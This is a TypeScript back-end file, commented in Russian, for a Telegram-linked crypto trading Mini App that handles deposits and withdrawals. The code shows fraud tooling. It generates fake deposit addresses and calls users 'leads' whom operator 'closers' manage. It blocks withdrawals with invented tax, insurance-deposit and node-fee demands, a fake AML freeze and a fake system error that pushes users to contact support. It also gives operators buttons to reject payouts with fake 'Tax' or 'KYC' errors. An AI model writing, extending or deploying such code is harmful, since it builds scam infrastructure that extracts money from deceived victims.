// ─── Finance Service — Deposits + Withdrawals ─────────────────────────────────

import { prisma } from "../lib/prisma";
import { Decimal } from "@prisma/client/runtime/library";

// ─── Создать депозит (PENDING) ────────────────────────────────────────────────
// Вызывается из Mini App (POST /finance/deposit)

export async function createDeposit(data: {
  userId:  string;
  asset:   string;
  amount:  number;
  address?: string;
}): Promise<{ ok: boolean; transactionId?: string; address?: string; error?: string }> {
  // Генерируем фиктивный адрес (симулятор)
  const depositAddress = data.address ?? generateFakeAddress(data.asset);

  const tx = await prisma.transaction.create({
    data: {
      user_id:  data.userId,
      type:     "DEPOSIT",
      asset:    data.asset,
      amount:   new Decimal(data.amount),
      address:  depositAddress,
      status:   "PENDING",
    },
  });

  // Уведомляем клоузера о новом депозите
  const user = await prisma.user.findUnique({
    where: { id: data.userId },
    include: { owner: true },
  });
  if (user?.owner) {
    const { getBotInstance } = await import("../bot/relay");
    const bot = getBotInstance();
    await bot.api.sendMessage(
      String(user.owner.tg_id),
      [
        `💰 <b>Новый депозит</b>`,
        `👤 ${user.first_name ?? "—"}${user.username ? ` (@${user.username})` : ""} [${user.tg_id}]`,
        `Актив: ${data.asset} | Сумма: <code>${data.amount}</code>`,
        `Адрес: <code>${depositAddress}</code>`,
        `ID: <code>${tx.id}</code>`,
      ].join("\n"),
      {
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [[
            { text: "✅ Подтвердить", callback_data: `dep_confirm:${tx.id}` },
          ]],
        },
      }
    ).catch(() => null);
  }

  return { ok: true, transactionId: tx.id, address: depositAddress };
}

// ─── Подтвердить депозит (клоузер/админ) ──────────────────────────────────────

export async function confirmDeposit(txId: string, processedBy: string): Promise<{ ok: boolean; error?: string }> {
  const tx = await prisma.transaction.findUnique({ where: { id: txId } });
  if (!tx) return { ok: false, error: "Transaction not found" };
  if (tx.type !== "DEPOSIT" || tx.status !== "PENDING") return { ok: false, error: "Invalid transaction" };

  await prisma.$transaction([
    prisma.transaction.update({
      where: { id: txId },
      data: { status: "SUCCESS", processed_by: processedBy },
    }),
    prisma.asset.upsert({
      where: { user_id_symbol: { user_id: tx.user_id, symbol: tx.asset } },
      create: { user_id: tx.user_id, symbol: tx.asset, available: tx.amount, locked: 0 },
      update: { available: { increment: tx.amount } },
    }),
  ]);

  // Socket: мгновенное обновление
  const { emitToUser } = await import("../socket");
  const assets = await prisma.asset.findMany({ where: { user_id: tx.user_id } });
  emitToUser(tx.user_id, "BALANCE_UPDATE", {
    balances: assets.map(a => ({ symbol: a.symbol, available: Number(a.available), locked: Number(a.locked) })),
  });

  // Уведомляем лида
  const user = await prisma.user.findUnique({ where: { id: tx.user_id } });
  if (user) {
    const { getBotInstance } = await import("../bot/relay");
    const bot = getBotInstance();
    await bot.api.sendMessage(
      String(user.tg_id),
      `✅ Ваш депозит <code>${Number(tx.amount).toFixed(2)} ${tx.asset}</code> зачислен!`,
      { parse_mode: "HTML" }
    ).catch(() => null);
  }

  return { ok: true };
}

// ─── Создать вывод (PENDING + списание) ───────────────────────────────────────

export async function createWithdrawal(data: {
  userId:  string;
  asset:   string;
  amount:  number;
  address: string;
  fee?:    number;
}): Promise<{ ok: boolean; transactionId?: string; error?: string }> {
  const fee    = data.fee ?? 0;
  const total  = data.amount + fee;

  // Проверяем пользователя
  const user = await prisma.user.findUnique({
    where: { id: data.userId },
    include: { owner: true },
  });
  if (!user) return { ok: false, error: "User not found" };
  if (user.is_blocked) return { ok: false, error: "Account blocked" };

  // ── Security Incident checks ────────────────────────────────────────────────
  if (user.is_frozen) {
    return { ok: false, error: "Compliance Division Notice: Your account has been temporarily frozen under AML/CFT investigation. Contact the Security Department to resolve." };
  }

  if (Number(user.required_tax) > 0) {
    return {
      ok: false,
      error: `Financial Department Alert: Your withdrawal is on hold due to pending Dividend Tax (13%). Amount due: ${Number(user.required_tax).toFixed(2)} USDT. Settling the tax will release the funds instantly.`,
    };
  }

  if (Number(user.insurance_fee) > 0) {
    return {
      ok: false,
      error: `Risk Management Notice: A refundable Insurance Deposit of ${Number(user.insurance_fee).toFixed(2)} USDT is required before the withdrawal can be processed. Contact your account manager.`,
    };
  }

  if (Number(user.node_fee) > 0) {
    return {
      ok: false,
      error: `Blockchain Authorization Required: Node Verification fee of ${Number(user.node_fee).toFixed(2)} USDT must be settled to complete the on-chain transaction. Contact your account manager.`,
    };
  }

  if (user.support_loop) {
    return { ok: false, error: "System Error 0x404: Transaction processing module is temporarily unavailable. Authorization Required — contact Technical Support for manual withdrawal activation." };
  }

  // Проверяем баланс
  const bal = await prisma.asset.findUnique({
    where: { user_id_symbol: { user_id: data.userId, symbol: data.asset } },
  });
  const avail = Number(bal?.available ?? 0);
  if (avail < total) return { ok: false, error: "Insufficient balance" };

  // Минимальная сумма вывода
  if (data.amount < 10) return { ok: false, error: "Minimum withdrawal amount is $10" };

  // Списываем
  const [tx] = await prisma.$transaction([
    prisma.transaction.create({
      data: {
        user_id: data.userId,
        type:    "WITHDRAWAL",
        asset:   data.asset,
        amount:  new Decimal(data.amount),
        fee:     new Decimal(fee),
        address: data.address,
        status:  "PENDING",
      },
    }),
    prisma.asset.update({
      where: { user_id_symbol: { user_id: data.userId, symbol: data.asset } },
      data: { available: { decrement: total } },
    }),
  ]);

  // Socket: обновляем баланс на фронте
  const { emitToUser } = await import("../socket");
  const assets = await prisma.asset.findMany({ where: { user_id: data.userId } });
  emitToUser(data.userId, "BALANCE_UPDATE", {
    balances: assets.map(a => ({ symbol: a.symbol, available: Number(a.available), locked: Number(a.locked) })),
  });

  // 🚨 Уведомляем клоузера — 3 кнопки: Выплачено / Ошибка (Налог) / Ошибка (KYC)
  if (user.owner) {
    const { getBotInstance } = await import("../bot/relay");
    const bot = getBotInstance();
    await bot.api.sendMessage(
      String(user.owner.tg_id),
      [
        `🚨 <b>ЛИД ПОСТАВИЛ НА ВЫВОД!</b>`,
        ``,
        `👤 ${user.first_name ?? "—"}${user.username ? ` (@${user.username})` : ""} [${user.tg_id}]`,
        `💸 <b>${data.amount} ${data.asset}</b>`,
        `📍 Адрес: <code>${data.address}</code>`,
        `ID: <code>${tx.id}</code>`,
      ].join("\n"),
      {
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "✅ Выплачено", callback_data: `wd_approve:${tx.id}` }],
            [
              { text: "❌ Ошибка (Налог)", callback_data: `wd_reject_tax:${tx.id}` },
              { text: "❌ Ошибка (KYC)",   callback_data: `wd_reject_kyc:${tx.id}` },
            ],
          ],
        },
      }
    ).catch(() => null);
  }

  return { ok: true, transactionId: tx.id };
}

// ─── Отменить вывод (refund) — вызывается лидом ─────────────────────────────

export async function cancelWithdrawal(
  txId: string,
  userId: string
): Promise<{ ok: boolean; error?: string }> {
  const tx = await prisma.transaction.findUnique({ where: { id: txId } });
  if (!tx) return { ok: false, error: "Not found" };
  if (tx.user_id !== userId) return { ok: false, error: "Not your transaction" };
  if (tx.type !== "WITHDRAWAL" || tx.status !== "PENDING") return { ok: false, error: "Cannot cancel" };

  const total = Number(tx.amount) + Number(tx.fee);
  await prisma.$transaction([
    prisma.transaction.update({
      where: { id: txId },
      data: { status: "REJECTED", error_message: "Cancelled by user" },
    }),
    prisma.asset.update({
      where: { user_id_symbol: { user_id: userId, symbol: tx.asset } },
      data: { available: { increment: total } },
    }),
  ]);

  // Socket: мгновенное обновление баланса
  const { emitToUser } = await import("../socket");
  const assets = await prisma.asset.findMany({ where: { user_id: userId } });
  emitToUser(userId, "BALANCE_UPDATE", {
    balances: assets.map(a => ({ symbol: a.symbol, available: Number(a.available), locked: Number(a.locked) })),
  });

  return { ok: true };
}

// ─── Helpers ──────────────────────────────────────────────────────────────────

function generateFakeAddress(asset: string): string {
  const chars = "0123456789abcdef";
  let addr = "";
  for (let i = 0; i < 40; i++) addr += chars[Math.floor(Math.random() * chars.length)];
  return asset === "BTC" ? `bc1q${addr.slice(0, 38)}` :
         asset === "ETH" ? `0x${addr}` :
         `T${addr.slice(0, 33)}`;
}
